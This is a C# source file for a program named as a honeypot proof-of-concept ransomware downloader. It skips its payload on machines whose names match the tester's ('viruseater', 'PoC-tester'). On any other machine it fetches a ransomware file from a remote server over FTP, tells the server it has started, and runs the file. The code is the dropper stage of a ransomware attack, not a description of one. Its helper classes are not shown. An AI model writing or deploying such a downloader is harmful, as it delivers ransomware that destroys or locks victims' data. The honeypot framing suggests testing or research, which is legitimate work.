using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace HoneyPotPOCRansomwareDownloader
{
    class Program
    {
        static void Main(string[] args)
        {
            ransomwareDownload();
        }

        public static void ransomwareDownload()
        {
            //Ensure that the ransomware will not be downloaded on the host computer
            if (Environment.MachineName.Contains("viruseater")) return;
            if (Environment.UserName.Contains("viruseater")) return;
            if (Environment.UserName.Contains("PoC-tester")) return;
            Thread.Sleep(2000);
            //The filepath is set to desktop
            serverCommunicator.setRansomwareFilePath();
            //Find the name of the ransomware
            serverCommunicator.getPOCHost();
            Thread.Sleep(100);
            Console.WriteLine(serverCommunicator.getNAMEONTEST());
            Thread.Sleep(100);

            //Download the ransomware
            serverCommunicator.downloadFileFTP();

            Thread.Sleep(100);
            
            //Inform the server that the ransomware is executed post this
            serverCommunicator.postPoCStarted();

            Thread.Sleep(100);

            //Execute the ransomware
            programExecuter.executeProgram(serverCommunicator.getRansomwareFilePath());

        }
    }
}
